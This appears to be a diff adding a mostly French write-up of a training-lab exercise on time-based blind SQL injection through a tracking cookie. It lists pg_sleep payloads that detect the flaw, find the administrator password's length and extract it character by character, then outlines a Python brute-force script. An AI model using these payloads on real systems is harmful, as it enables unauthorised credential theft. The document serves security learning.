@@ -1,0 +1,57 @@
+_______________________________________________________
+
+# Blind SQL injection with time delays and information retrieval
+
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+_______________________________________________________
+
+
+#Objectif : Retrouver les mot de passe de l'administrator puis se connecter à son compte en utilisatant une vulnérabilité d'injection basé sur le temps :
+
+_______________________________________________________
+
+#Resolution
+
+    SELECT TrackingId FROM TrackingId_table where TrackingId='ogAZZfxtOKUELbuJ' : voila la requête qui est executer par lapplication
+
+    TrackingId=ogAZZfxtOKUELbuJ'|| (pg_sleep(10)) : vulnérabilité d'injection SQL detecté ! car le temps de reponse est plus de 10 secondes
+
+    TrackingId=ogAZZfxtOKUELbuJ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END )-- :  
+
+    TrackingId=ogAZZfxtOKUELbuJ' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END )-- : 
+
+    TrackingId=ogAZZfxtOKUELbuJ' || (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')=20) THEN pg_sleep(10) ELSE pg_sleep(0) END )--
+
+    TrackingId=ogAZZfxtOKUELbuJ' || (SELECT CASE WHEN ((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='5') THEN pg_sleep(10) ELSE pg_sleep(0) END )-- : On obtient 5rebuvpwwrtz7ek8c68d
+
+    
+_______________________________________________________
+
+Ecriture du Script python 
+
+
+#Analyse pour Ecriture du Script python 
+
+0- Initialiser une session et lutiliser pour le reste du script 
+
+1- Recuperer le cookies
+
+2- Injecter le payload dans le tracking id contenu dans le cookies pour recuperer la taille du mot de passe
+
+3- Faire la force brute pour recuperer le mot de passe 
+
+4- Recuperer le csrf 
+
+5- Sur la page login se connecter pour solve le lab 
+
+
+
+
+
